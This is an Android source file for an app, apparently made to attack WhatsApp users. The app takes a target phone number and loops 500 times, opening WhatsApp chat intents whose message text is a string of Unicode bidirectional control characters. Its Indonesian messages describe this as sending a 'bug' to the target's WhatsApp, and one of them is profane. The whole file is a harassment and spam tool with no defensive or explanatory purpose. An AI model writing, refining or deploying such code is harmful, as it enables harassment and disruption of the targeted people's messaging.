package com.langz.bug;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    EditText target;
    Button kirim;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        target = findViewById(R.id.target);
        kirim  = findViewById(R.id.kirim);

        kirim.setOnClickListener(v -> {
            String nomor = target.getText().toString().trim();
            if (nomor.isEmpty()) {
                Toast.makeText(this, "Isi nomor dulu bangsat", Toast.LENGTH_SHORT).show();
                return;
            }
            spamBug(nomor);
        });
    }

    private void spamBug(String nomor) {
        Handler h = new Handler(Looper.getMainLooper());
        String payload = "\u202E\u202D\u202C\u200F\u200E";

        Runnable r = new Runnable() {
            int count = 0;
            @Override
            public void run() {
                if (count >= 500) {
                    Toast.makeText(MainActivity.this, "Bug terkirim, cek WA target", Toast.LENGTH_LONG).show();
                    return;
                }
                try {
                    Intent i = new Intent(Intent.ACTION_VIEW);
                    i.setPackage("com.whatsapp");
                    i.setData(Uri.parse("https://wa.me/" + nomor + "?text=" + Uri.encode(payload + count)));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                } catch (Exception e) {
                }
                count++;
                h.postDelayed(this, 50);
            }
        };
        h.post(r);
    }
                      }
